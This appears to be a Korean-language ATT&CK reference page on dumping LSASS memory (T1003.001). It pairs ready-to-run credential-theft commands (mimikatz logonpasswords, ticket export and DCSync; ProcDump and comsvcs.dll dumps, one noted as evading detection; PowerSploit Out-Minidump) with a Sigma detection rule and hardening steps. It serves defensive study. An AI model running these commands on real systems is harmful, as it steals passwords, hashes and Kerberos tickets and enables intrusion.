# T1003.001 — LSASS Memory Dump

## 개요

**TA0006 / T1003.001**  
LSASS(Local Security Authority Subsystem Service) 프로세스의 메모리를 덤프하여 평문 패스워드, NTLM 해시, Kerberos 티켓 등 자격증명을 추출하는 기법입니다. Windows 인증 메커니즘의 특성상 LSASS는 활성 세션의 자격증명을 메모리에 보관합니다.

---

## 동작 방식

1. SYSTEM 또는 SeDebugPrivilege 권한 획득
2. lsass.exe 프로세스 메모리 덤프 (직접 또는 LOLBin 활용)
3. 덤프 파일을 오프라인으로 분석하여 자격증명 추출
4. 추출된 해시/티켓으로 Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash 공격 수행

**추출 가능한 자격증명:**
- 평문 패스워드 (WDigest 활성화된 경우)
- NTLM 해시
- Kerberos TGT/TGS 티켓
- DPAPI 마스터 키

## 주요 커맨드 / 실습

### Mimikatz 직접 덤프
```cmd
# 관리자 권한으로 실행 필요
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# WDigest 평문 패스워드 추출
mimikatz# sekurlsa::wdigest

# Kerberos 티켓 추출
mimikatz# sekurlsa::tickets /export

# DCSync (도메인 관리자 권한 필요)
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### ProcDump (LOLBin - Sysinternals)
```cmd
# Microsoft 서명 도구로 LSASS 덤프
ProcDump.exe -ma lsass.exe lsass.dmp
ProcDump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

# 덤프 파일을 공격자 시스템으로 가져와 오프라인 분석
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

### comsvcs.dll MiniDump (LOLBin - 파일리스)
```cmd
# 탐지 우회를 위한 comsvcs.dll 활용 (Windows 내장)
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full

# PowerShell 버전
tasklist /fi "IMAGENAME eq lsass.exe" /fo csv
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (lsass PID) C:\temp\dump.bin full
```

### PowerSploit Out-Minidump
```powershell
Import-Module .\PowerSploit.psd1
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\
```

## 탐지 방법

### Sigma Rule
```yaml
title: LSASS Memory Access by Non-System Process
id: f9e4a5c2-8b3d-4f1e-a7c6-2d9e5b8f3a1c
status: stable
description: Detects suspicious access to LSASS process memory that may indicate credential dumping
logsource:
    product: windows
    category: process_access
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x147a'
            - '0x1fffff'
    filter:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
            - 'C:\Program Files\'
    condition: selection and not filter
falsepositives:
    - AV/EDR products that access LSASS for scanning
    - Windows Defender
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001
```

## 대응 방안

1. Windows Defender Credential Guard 활성화 (가상화 기반 LSASS 보호)
2. RunAsPPL(Protected Process Light) 활성화로 LSASS 보호
   ```reg
   HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1
   ```
3. WDigest 인증 비활성화 (평문 패스워드 메모리 저장 방지)
   ```reg
   HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0
   ```
4. Sysmon EventID 10 (ProcessAccess) 로깅으로 LSASS 접근 탐지
5. SeDebugPrivilege 최소화
6. EDR 솔루션으로 덤프 도구 실행 차단
